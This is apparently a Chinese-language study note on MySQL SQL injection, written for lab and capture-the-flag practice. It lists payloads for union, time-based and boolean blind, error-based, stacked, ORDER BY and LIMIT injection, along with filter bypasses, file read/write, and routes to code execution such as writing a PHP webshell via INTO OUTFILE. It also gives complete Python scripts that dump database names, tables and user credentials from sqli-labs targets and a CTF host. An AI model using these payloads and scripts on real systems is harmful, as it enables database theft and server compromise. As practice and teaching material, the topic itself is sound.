---
title: "sql注入"
modDatetime: 2025-01-20T21:06:41.000+08:00
description: "SQL 注入流程、信息获取、盲注、报错注入与写文件技巧"
tags: ["others"]
---

sql包括：
mysql、sqlite、MongoDB、Access等等，语法各有不同，在注入时若出现500错误，可能需要换个语言

以下是mysql注入

[流程](#流程)
[无列名注入](#无列名注入)
[时间盲注](#时间盲注)
[报错注入](#报错注入)

[各种注入方式](https://xz.aliyun.com/t/13604?time__1311=GqmxuD9QiQdWqGNDQ0PBKqKoyfTaD#toc-9)
[各种绕过方式](https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#%E4%BD%BF%E7%94%A8%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%BB%95%E8%BF%87-1)

## 查找注入点

### 有源码

thinkphp `where\(['"]\w+=\{?\$`

where\(|query\(|execute\(|order\(|field\(|limit\(

### 无源码

搜索：`id`
注册登录、修改账户信息：`username`, `password`

其他可能记录进数据库的用户请求信息
比如：这里看到打印了我的user-agent，说明代码中有对这部分进行处理分析，可以尝试。如果有一般是insert语句
![](assets/sql注入/Pasted%20image%2020251210211428.png)

## 流程:

### 判断闭合方式：

可以用`and 0 or sleep(1)`，根据回显时间判断是否注入成功

**字符型：**

单引号闭合 `select * from aaa where username = '$user_input'`
判断依据：`abc' or 1;#`

双引号闭合同理

**数字型**：
`select * from aaa where id = $user_input`
判断依据： 看4/2和2效果是否一致。

**括号闭合**
`select * from aaa where username in ($user_input)`
可能与其他类型混合

## 查数据库名、表名、列名

```python
inner_sql = "select group_concat(SCHEMA_NAME) from information_schema.schemata"
# inner_sql = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# inner_sql = "select group_concat(column_name) from information_schema.columns where table_name='admin'"
# inner_sql = "select group_concat(name, ' : ',  pass) from admin"
```

### 攻击脚本模板

```python
import re
import requests

url = "http://localhost:8888/Less-1"
proxies = {
    "http": "http://192.168.50.1:8083"
}

payloads = [
    # "union select 1,2,group_concat(SCHEMA_NAME) from information_schema.schemata#" # information_schema,challenges,mysql,performance_schema,security
    # "union select 1,2,database();#", # security
    # "union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#" #emails,referers,uagents,users
    # "union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'#" # id,username,password
    "union select 1,2,group_concat(username, ':::', password) from security.users#"  # Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4
]

for payload in payloads:
    params = {
        "id": "abc'" + payload
    }
    resp = requests.get(url=url, params=params, proxies=proxies)
    res = re.findall("Your Password:(.*?)</font>", resp.text)
    if(res):
        print(res[0])
    else:
        err_index = resp.text.find('<font color= "#FFFF00">')
        print(resp.text[err_index:].strip())
```

## 读写文件

可以通过`SELECT @@global.secure_file_priv;`或`SHOW VARIABLES LIKE 'secure_file_priv';` 获取可以读写文件的目录。
**读文件**：
`select load_file("path")`或`load data infile '/var/lib/mysql-files/flag' into table abc`
![](assets/sql注入/Pasted%20image%2020251201181035.png)
![](assets/sql注入/Pasted%20image%2020251201181038.png)
**写文件:**
`select 'hello' into outfile '/var/lib/mysql-files/res'`
![](assets/sql注入/Pasted%20image%2020251201181217.png)

## 联合查询注入

`select ... where ...union select ...`

## 无列名注入

**mysql>5.6.2**
当information_schema被ban时候可以通过一些内置的表查到目标表名。如
`mysql.innodb_index_stats`包括所有存在索引的表（主键会自动构建索引）
`mysql.innodb_table_stats` 包括存在自增字段的表
`sys.schema_table_statistics_with_buffer` 包括上次重启后`有使用到的`表
数据一样的还有
`sys.x$schema_table_statistics_with_buffer`
`performance_schema.table_io_waits_summary_by_table`
`sys.x$innodb_buffer_stats_by_table`
`sys.x$ps_schema_table_statistics_io`(好像东西多一点,可能因为重启不会重置)

接着使用无列名注入获取列名.然后获取数据

### join using

**payload**

```sql
select * from (select * from TABLE_NAME as a join TABLE_NAME as b) as c
select * from (select * from TABLE_NAME as a join TABLE_NAME as b using(COLUMN1_NAME)) as c
select * from (select * from TABLE_NAME as a join TABLE_NAME as b using(COLUMN1_NAME,COLUMN2_NAME)) as c
```

### 子查询

**payload**

```sql
select a.2 from (select 1,2,3,4 union select * from users) as a
```

### order by 盲注

## 时间盲注

可能用到的函数有
mid, substr, left, right

比如要猜测一个flag，共3个字符
对于第一个字符，遍历所有可能的取值，如果正确，则sleep，根据时间判断是否正确。

可以先判断如何闭合：

```sql
' and select if(1=1,sleep(3),0);
```

如3s后响应则正确闭合.

然后判断数据库名称:

```sql
' and select if(ascii(substr(database(),1,1))=109,sleep(3),0);
```

3s后响应则数据库的第一个字符是'm'

```python
import time
import requests

url = "http://192.168.50.2:8888/Less-9"

proxies = {
    "http": "http://192.168.50.1:10001"
}

TIME_TO_SLEEP = 1

def check_status(status):
    # white list status code
    white_list = [200, ]
    if status not in white_list:
        if(status == 429):
            raise Exception("\033[31mtoo many request")
        else:
            raise Exception(f"\033[31m unexpected status code {status}")

def request_and_check(payload):
    param = {
        "id": "1' and " + payload + "#"
    }
    before_time = time.time_ns()
    resp = requests.get(url=url, params=param, proxies=proxies)
    check_status(resp.status_code)
    after_time = time.time_ns()
    delta = (after_time - before_time)
    return  (delta // 10**9) >= TIME_TO_SLEEP

def get_length(sqli_str, length_limit = 200):
    # linear, slow

    # for length in range(length_limit):
    #     payload = f"if((length(({sqli_str}))={length}),2,1)"
    #     hit = request_and_check(payload)
    #     if(hit):
    #         return length
    # raise Exception("数据长度过长或者注入失败")

    # binary
    hit = False
    right = length_limit
    left = 0
    mid = (right + left) // 2
    while left<right:
        payload = f"if((length(({sqli_str}))>{mid}),sleep({TIME_TO_SLEEP}), 0)"
        hit = request_and_check(payload)
        if(hit):
            left = mid + 1
        else:
            right = mid
        mid = (right + left) // 2

    print(f"length is {mid}")
    return mid

def get_data(sqli_str, length):
    # linear

    # candidates = string.printable
    # res = ""
    # for start in range(1, length+1):
    #     for candidate_chr in candidates:
    #         candidate = ord(candidate_chr)
    #         payload = f"if(ascii((substr(({sqli_str}),{start},1)))={candidate},2,1)"
    #         hit = request_and_check(payload)
    #         if(hit):
    #             res += candidate_chr
    #             start += 1
    #             print(f"hit, current res: {res}")
    #             break
    #     if(not hit):
    #         raise Exception(f"not hit in char {start}")

    # binary

    res = ""

    for start in range(1, length+1):
        left = 32 # 0
        right = 127
        while left < right:
            mid = (left + right) // 2
            payload = f"if(ascii((substr(({sqli_str}),{start},1)))>{mid},sleep({TIME_TO_SLEEP}),0)"
            hit = request_and_check(payload)
            if(hit):
                left = mid + 1
            if(not hit):
                right = mid

        # verify
        payload = f"if(ascii((substr(({sqli_str}),{start},1)))={left},sleep({TIME_TO_SLEEP}),0)"
        hit = request_and_check(payload)
        if not hit:
            print("xxxxxxxxxxxx")
            print("current res: ", res)
            raise Exception("not hit this round")
        else:
            res += chr(left)
            print("current res: ", res)


    print("---------------done--------------")
    return res

# select group_concat(table_name) from information_schema.tables where table_schema=database()
# select group_concat(column_name) from information_schema.columns where table_name='users'
# select secret_key from secret_vault
sqli_str = "select group_concat(table_name) from information_schema.tables where table_schema=database()"

length = get_length(sqli_str, length_limit=100)
data = get_data(sqli_str, length)

with open("result", "w") as f:
    f.write(data)

print(f"\033[34m{sqli_str}\033[0m")
print(f"\033[32m{data}\033[0m")
```

## 布尔盲注

用上面时间盲注的payload稍加改造，替换hit的逻辑即可。
时间盲注实际上也属于布尔盲注

```python
import time
import requests

url = "http://challenge.shc.tf:30905"

proxies = {
    "http": "http://192.168.50.1:10001"
}

def check_status(status):
    # white list status code
    white_list = [200, ]
    if status not in white_list:
        if(status == 429):
            raise Exception("\033[31mtoo many request")
        else:
            raise Exception(f"\033[31m unexpected status code {status}")

def request_and_check(payload):
    param = {
        "id": "1' and " + payload + "#"
    }
    resp = requests.get(url=url, params=param, proxies=proxies)
    check_status(resp.status_code)
    return resp.text.find("该档案存在") > -1 # hit

def get_length(sqli_str, length_limit = 200):
    # linear, slow

    # for length in range(length_limit):
    #     payload = f"if((length(({sqli_str}))={length}),2,1)"
    #     hit = request_and_check(payload)
    #     if(hit):
    #         return length
    # raise Exception("数据长度过长或者注入失败")

    # binary
    hit = False
    right = length_limit
    left = 0
    mid = (right + left) // 2
    while left<right:
        payload = f"if((length(({sqli_str}))>{mid}),1, 0)"
        hit = request_and_check(payload)
        if(hit):
            left = mid + 1
        else:
            right = mid
        mid = (right + left) // 2

    return mid

def get_data(sqli_str, length):
    # linear

    # candidates = string.printable
    # res = ""
    # for start in range(1, length+1):
    #     for candidate_chr in candidates:
    #         candidate = ord(candidate_chr)
    #         payload = f"if(ascii((substr(({sqli_str}),{start},1)))={candidate},2,1)"
    #         hit = request_and_check(payload)
    #         if(hit):
    #             res += candidate_chr
    #             start += 1
    #             print(f"hit, current res: {res}")
    #             break
    #     if(not hit):
    #         raise Exception(f"not hit in char {start}")

    # binary

    res = ""

    for start in range(42, length+1):
        left = 32 # 0
        right = 127
        while left < right:
            mid = (left + right) // 2
            payload = f"if(ascii((substr(({sqli_str}),{start},1)))>{mid},1,0)"
            hit = request_and_check(payload)
            if(hit):
                left = mid + 1
            if(not hit):
                right = mid

        # verify
        payload = f"if(ascii((substr(({sqli_str}),{start},1)))={left},1,0)"
        hit = request_and_check(payload)
        if not hit:
            print("xxxxxxxxxxxx")
            print("current res: ", res)
            raise Exception("not hit this round")
        else:
            res += chr(left)
            print("current res: ", res)


    print("---------------done--------------")
    return res

# select group_concat(table_name) from information_schema.tables where table_schema=database()
# select group_concat(column_name) from information_schema.columns where table_name='users'
# select secret_key from secret_vault
sqli_str = "select secret_key from secret_vault"

length = get_length(sqli_str, length_limit=100)
data = get_data(sqli_str, length)

with open("result", "w") as f:
    f.write(data)

print(f"\033[34m{sqli_str}\033[0m")
print(f"\033[32m{data}\033[0m")
```

## 报错注入

打印出报错信息的情况下可用

1. updatexml(1,<注入语句>,1)
2. extractvalue(1,<注入语句>)

条件报错，执行时才报错

1. select 1 regexp ''
2. select 1 rlike if(1=2, '(', 'a')
   由于 '(' 是非法正则，所以报错

例如:

```sql
1' and extractvalue(1,concat(0x7e,(select substr(group_concat(table_name), 1, 31) from information_schema.tables where table_schema=database()))) #
```

其中0x7e是让路径报错的关键, 且放在concat的第一个位置

报错最多32个字符,所以如果需要回显的字符数量超过32,则需要用到substr来分批次得到结果.
截取结果可用函数

- substr(str, pos [, length])
- mid（与substr一致）
- left(str, pos) 从左数第pos个以后的所有
- right 从右数
- TRIM([{BOTH|LEADING|TRAILING} [substr] FROM] str)
- reverse(str)
- insert(str, pos, end, replaced_str) # 把从pos开始到end结束的字符串替换成replaced_str

## 多语句注入（堆叠注入）

就是一次查询允许执行多条sql语句。通过`;`注入
可以在select语句后注入create、insert语句

支持多语句查询的函数有：
php `mysqli_multi_query`
后续的语句会在后台执行，不会报错，不会延时

## order by注入

实际上与where没什么区别

### 方式

可以用select子查询注入`order by (select ...)`
也可以用`if`或者`case when`
如`if(0, 10, sleep(10))` || `order by case when 1 then sleep(10) end`

报错注入extractvalue
堆叠注入也可以

### 原理

由于order by后面应该指定列名，而不是字符串，因此预编译没法按预期工作。比如mybatis 写`order by #{}`会报错。

order by后面不能跟union select。

## limit，offset注入

`union select`注入（低版本可用）

`select 1 limit 1 union select group_concat(table_name) from information_schema.tables where table_schema=database() order by 1 desc limit 1;`

procedure注入（**5.0.0< MySQL <5.6.6**）

`select * from users limit 1 offset 1 procedure analyse((select extractvalue(1, concat(0x7e, 1))),1);`

## 过滤

1. 过滤等号 ---> like
2. 过滤空格 ---> 括号

```sql
select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')))
```

3. 过滤or ---> 用||，或者^（异或）
4. substr ---> right
5. 过滤select
   1. 用prepare

```sql
-1';
set @sql = CONCAT('se','lect * from `1919810931114514`;');
prepare stmt from @sql;
EXECUTE stmt;
```

     2. handler语句

```sql
1';
handler $TABLE_NAME open;
handler $TABLE_NAME read first;
...read next;
```

    3. 大小写绕过

## mysql到RCE

https://www.sqlsec.com/2020/11/mysql.html

1. 写马
   `select 'abc' into outfile '/var/www/html/shell.php'`

2. udf
   user define function，通过select into outfile的方式写.so文件，自定义函数

3. mof
   Windows Server 2003环境下，写vbs脚本到mof目录下，类似定时命令

4. CVE组合拳
   2016-6662从sql命令->RCE,借助mysqld的mysql权限，写my.conf，加载任意.so库
   https://www.freebuf.com/vuls/243513.html

2016-6663实现从www-data到mysql权限
https://www.cnblogs.com/dliv3/p/6412642.html

2016-6664实现mysql用户->root，改error.log为/etc/ld.so.preload的符号连接，借助mysql_safe的root权限，会创建error.log，实则创建了/etc/ld.so.preload，且权限是mysql，再利用mysql权限写/etc/ld.so.preload，执行suid命令提权
https://www.cnblogs.com/dliv3/p/6412653.html
